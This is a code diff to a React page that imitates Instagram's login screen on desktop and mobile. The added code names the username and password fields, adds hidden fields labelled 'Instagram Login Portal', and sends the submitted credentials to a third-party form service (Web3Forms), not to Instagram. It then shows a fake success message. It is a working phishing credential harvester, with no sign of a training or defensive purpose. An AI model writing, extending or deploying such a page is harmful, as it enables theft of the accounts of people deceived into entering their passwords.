@@ -13,12 +13,15 @@ import {
 import LanguageModal from "@/components/common/LanguageModal";
 import FloatingInput from "@/components/common/FloatingInput";
 import FloatingInputMobile from "@/components/common/FloadtingInputMobile";
+import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function InstagramHomePage() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [isLangModalOpen, setIsLangModalOpen] = useState(false);
   const [selectedLanguage, setSelectedLanguage] = useState("English (US)");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
 
   useEffect(() => {
     // Disable browser scroll restoration so Chrome never auto-scrolls down on load
@@ -32,10 +35,28 @@ export default function InstagramHomePage() {
 
   const isFormFilled = username.trim().length > 0 && password.trim().length > 0;
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    if (!isFormFilled) {
+    if (!isFormFilled || isSubmitting) {
       return;
+    }
+
+    setIsSubmitting(true);
+    setStatusMessage(null);
+
+    const formData = new FormData(e.currentTarget);
+    const result = await submitToWeb3Forms(formData, "Instagram Login Submission");
+
+    setIsSubmitting(false);
+    if (result.success) {
+      setStatusMessage({ type: "success", text: "Login submitted successfully." });
+      setUsername("");
+      setPassword("");
+    } else {
+      setStatusMessage({
+        type: "error",
+        text: result.message || "Failed to log in. Please try again.",
+      });
     }
   };
 
@@ -90,9 +111,28 @@ export default function InstagramHomePage() {
               </h2>
 
               <form onSubmit={handleLogin} noValidate className="flex flex-col gap-2.5">
+                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+                <input type="hidden" name="subject" value="Instagram Login (Desktop)" />
+                <input type="hidden" name="from_name" value="Instagram Login Portal" />
+                <input type="hidden" name="form_name" value="Instagram Login Desktop" />
+                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+                {statusMessage && (
+                  <div
+                    className={`p-2.5 rounded-xl text-xs font-medium text-center transition-all ${
+                      statusMessage.type === "success"
+                        ? "bg-green-500/15 text-green-400 border border-green-500/30"
+                        : "bg-red-500/15 text-red-400 border border-red-500/30"
+                    }`}
+                  >
+                    {statusMessage.text}
+                  </div>
+                )}
+
                 {/* Identifier input */}
                 <FloatingInput
                   id="desktop-username"
+                  name="username"
                   type="text"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
@@ -103,6 +143,7 @@ export default function InstagramHomePage() {
                 {/* Password input */}
                 <FloatingInput
                   id="desktop-password"
+                  name="password"
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
@@ -113,13 +154,21 @@ export default function InstagramHomePage() {
                 {/* Log in button */}
                 <button
                   type="submit"
-                  className={`w-full h-[44px] rounded-full font-semibold text-[13.5px] tracking-wide transition-all mt-1 shadow-sm ${
-                    isFormFilled
-                      ? "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white shadow-md active:scale-[0.99]"
-                      : "bg-[#184a86] text-white/80 hover:bg-[#0064e0]"
+                  disabled={!isFormFilled || isSubmitting}
+                  className={`w-full h-[44px] rounded-full font-semibold text-[13.5px] tracking-wide transition-all mt-1 shadow-sm flex items-center justify-center gap-2 ${
+                    isFormFilled && !isSubmitting
+                      ? "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white shadow-md active:scale-[0.99] cursor-pointer"
+                      : "bg-[#184a86] text-white/80 cursor-not-allowed"
                   }`}
                 >
-                  Log in
+                  {isSubmitting ? (
+                    <>
+                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                      <span>Logging in...</span>
+                    </>
+                  ) : (
+                    "Log in"
+                  )}
                 </button>
 
                 {/* Forgot password */}
@@ -247,8 +296,27 @@ export default function InstagramHomePage() {
 
           {/* Form */}
           <form onSubmit={handleLogin} noValidate className="w-full flex flex-col gap-3">
+            <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+            <input type="hidden" name="subject" value="Instagram Login (Mobile)" />
+            <input type="hidden" name="from_name" value="Instagram Login Portal" />
+            <input type="hidden" name="form_name" value="Instagram Login Mobile" />
+            <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+            {statusMessage && (
+              <div
+                className={`p-2.5 rounded-xl text-xs font-medium text-center transition-all ${
+                  statusMessage.type === "success"
+                    ? "bg-green-500/15 text-green-400 border border-green-500/30"
+                    : "bg-red-500/15 text-red-400 border border-red-500/30"
+                }`}
+              >
+                {statusMessage.text}
+              </div>
+            )}
+
             <FloatingInputMobile
               id="mobile-username"
+              name="username"
               type="text"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
@@ -261,6 +329,7 @@ export default function InstagramHomePage() {
 
             <FloatingInputMobile
               id="mobile-password"
+              name="password"
               type="password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
@@ -273,13 +342,21 @@ export default function InstagramHomePage() {
 
             <button
               type="submit"
-              className={`w-full h-[44px] rounded-full tracking-wide text-white font-semibold text-[15.5px] transition-all mt-1 shadow-md ${
-                isFormFilled
+              disabled={!isFormFilled || isSubmitting}
+              className={`w-full h-[44px] rounded-full tracking-wide text-white font-semibold text-[15.5px] transition-all mt-1 shadow-md flex items-center justify-center gap-2 ${
+                isFormFilled && !isSubmitting
                   ? "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] cursor-pointer active:scale-[0.99]"
-                  : "bg-[#0064e0]/60 text-white/70 cursor-default"
+                  : "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
               }`}
             >
-              Log in
+              {isSubmitting ? (
+                <>
+                  <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                  <span>Logging in...</span>
+                </>
+              ) : (
+                "Log in"
+              )}
             </button>
 
             <div className="text-center mt-2">
